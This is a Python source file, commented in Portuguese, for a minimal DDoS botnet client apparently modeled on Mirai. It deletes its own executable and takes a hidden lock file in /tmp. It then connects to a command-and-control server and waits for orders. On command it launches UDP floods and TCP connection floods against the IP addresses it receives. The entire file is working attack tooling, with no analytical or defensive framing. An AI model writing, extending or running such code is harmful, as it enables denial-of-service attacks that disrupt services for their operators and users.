#!/usr/bin/env python3
"""
Versão minimalista do bot para ambientes com recursos limitados.
Menos imports, menos threads, funcionalidade essencial.
"""

import socket
import struct
import sys
import os
import time
import threading
import json


class MinimalBot:
    """Bot minimalista — apenas o essencial."""
    
    def __init__(self, cnc_host='127.0.0.1', cnc_port=48101):
        self.cnc_host = cnc_host
        self.cnc_port = cnc_port
        self.sock = None
        self.running = False
        
        # Auto-delete
        try:
            if getattr(sys, 'frozen', False):
                os.unlink(sys.executable)
        except:
            pass
        
        # Single instance
        import hashlib
        lock_id = hashlib.md5(cnc_host.encode()).hexdigest()[:8]
        self.lock_file = f'/tmp/.mlock_{lock_id}'
        
    def start(self):
        if os.path.exists(self.lock_file):
            return  # Já rodando
        open(self.lock_file, 'w').write(str(os.getpid()))
        
        self.running = True
        
        while self.running:
            try:
                self._connect_and_serve()
            except:
                time.sleep(5)
        
        try:
            os.unlink(self.lock_file)
        except:
            pass
    
    def _connect_and_serve(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(30)
        self.sock.connect((self.cnc_host, self.cnc_port))
        
        # Handshake
        hostname = os.uname().nodename.encode()[:20]
        self.sock.sendall(b'MIRA' + bytes([len(hostname)]) + hostname)
        
        if self.sock.recv(1) != b'\x01':
            return
        
        # Loop de comandos
        buf = b""
        while self.running:
            try:
                data = self.sock.recv(4096)
                if not data:
                    break
                buf += data
                
                while len(buf) >= 4:
                    size = struct.unpack('!I', buf[:4])[0]
                    if len(buf) < 4 + size:
                        break
                    
                    cmd_data = buf[4:4+size]
                    buf = buf[4+size:]
                    
                    # Executa ataque (thread separada)
                    t = threading.Thread(target=self._run_attack, args=(cmd_data,))
                    t.daemon = True
                    t.start()
                    
            except socket.timeout:
                continue
            except:
                break
        
        self.sock.close()
    
    def _run_attack(self, data):
        """Executa ataque baseado no comando recebido."""
        # Parse simplificado
        duration = struct.unpack('<I', data[:4])[0]
        attack_type = data[4]
        targets_count = data[5]
        
        offset = 6
        for _ in range(targets_count):
            ip_bytes = data[offset:offset+4]
            offset += 5
        
        target_ip = f"{ip_bytes[0]}.{ip_bytes[1]}.{ip_bytes[2]}.{ip_bytes[3]}"
        
        self.sock.send(b'\x01')  # ACK
        
        # Executa ataque baseado no tipo
        if attack_type == 0:  # UDP
            self._udp_flood(target_ip, 80, duration)
        elif attack_type == 3:  # SYN
            self._syn_flood(target_ip, 80, duration)
        elif attack_type == 8:  # UDP_PLAIN
            self._udp_flood(target_ip, 80, duration, randomize=False)
        
        self.sock.send(b'\x02')  # Completed
    
    def _udp_flood(self, ip, port, duration, randomize=True):
        end = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while time.time() < end:
            try:
                p = os.urandom(random.randint(512, 1024)) if randomize else b'\x00' * 1024
                p2 = random.randint(1, 65535) if randomize else port
                sock.sendto(p, (ip, p2))
            except:
                pass
        sock.close()
    
    def _syn_flood(self, ip, port, duration):
        end = time.time() + duration
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(os.urandom(512))
                s.close()
            except:
                pass


if __name__ == '__main__':
    import random
    cnc = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 48101
    MinimalBot(cnc, port).start()
